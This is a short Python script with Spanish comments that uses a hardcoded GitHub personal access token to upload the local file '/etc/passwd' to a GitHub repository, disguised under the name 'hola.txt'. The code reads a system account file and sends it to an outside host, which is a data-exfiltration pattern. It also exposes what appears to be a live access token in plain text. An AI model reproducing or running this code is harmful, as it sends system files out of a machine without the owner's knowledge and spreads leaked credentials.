from github import Github

def run():
    # Token de acceso personal de GitHub
    # Puedes generar uno en: https://github.com/settings/tokens
    ACCESS_TOKEN = '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'

    # Nombre del repositorio
    REPO_NAME = 'almacenlar'

    # Ruta local del archivo que quieres subir
    LOCAL_FILE_PATH = '/etc/passwd'

    def upload_to_github():
        # Autenticación con tu token
        g = Github(ACCESS_TOKEN)

        # Obtener el repositorio
        repo = g.get_user().get_repo(REPO_NAME)

        # Leer el contenido del archivo en modo binario
        with open(LOCAL_FILE_PATH, 'rb') as file:
            file_content = file.read()

        # Crear un nuevo archivo en el repositorio de GitHub
        repo.create_file(
            path='hola.txt',
            message='Subir hola.txt',
            content=file_content
        )

    if __name__ == "__main__":
        upload_to_github()
